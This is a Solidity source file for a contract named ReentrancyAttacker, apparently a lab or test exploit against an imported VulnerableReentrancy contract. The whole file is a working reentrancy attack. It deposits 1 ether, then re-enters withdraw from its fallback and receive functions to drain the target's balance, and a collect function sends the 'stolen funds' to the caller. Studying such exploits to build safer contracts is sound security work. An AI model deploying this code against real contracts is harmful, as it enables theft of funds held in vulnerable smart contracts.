// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {VulnerableReentrancy} from "./VulnerableReentrancy.sol";
contract ReentrancyAttacker {
    VulnerableReentrancy public vulnerableBank;
    constructor(address _vulnerablebankAddresst) {
        vulnerableBank = VulnerableReentrancy(_vulnerablebankAddresst);
    }
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, " Mininum 1 ether required to attack");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(1 ether);
    }
    // Function to withdraw the stolen funds

    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
